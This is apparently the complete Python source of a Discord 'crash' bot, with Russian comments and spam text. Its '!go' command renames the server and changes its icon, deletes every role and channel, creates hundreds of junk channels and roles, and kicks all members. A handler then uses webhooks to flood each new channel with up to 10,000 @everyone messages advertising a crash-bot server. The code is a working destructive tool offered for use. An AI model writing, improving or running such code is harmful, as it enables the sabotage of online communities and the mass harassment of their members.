import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
from keep_alive import keep_alive
keep_alive()


intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!',intents=intents)

bot.remove_command("help")

@bot.command()
async def go(ctx):
        guild = ctx.message.guild     
        with open('hacked.jpg', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crash By HACKER BOT", icon=icon)

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete(reason="Краш сервера")
            except:
                pass

        for channel in ctx.guild.channels:  # собираем
                try:
                        await channel.delete(reason="Краш сервера")  # удаляем
                except:
                        pass


        for _ in range(300):
            await guild.create_text_channel('crash-by-msk snejok332')

        for _ in range(300):
          await guild.create_role(name='crash-by-msk snejok332')

        for m in ctx.guild.members:
          try:
           await m.kick(reason="Краш сервера")
          except:
           pass
        

        
@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crash By HACKER BOT")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(10000):
        try:
          await webhook.send("@everyone\nДанный сервер крашиться ботом Crash By HACKER BOT\nсервер дискорд с краш ботами: https://discord.gg/KJwFcUD5uS")
        except:
          pass       
token = 'тут токен'
bot.run(token)
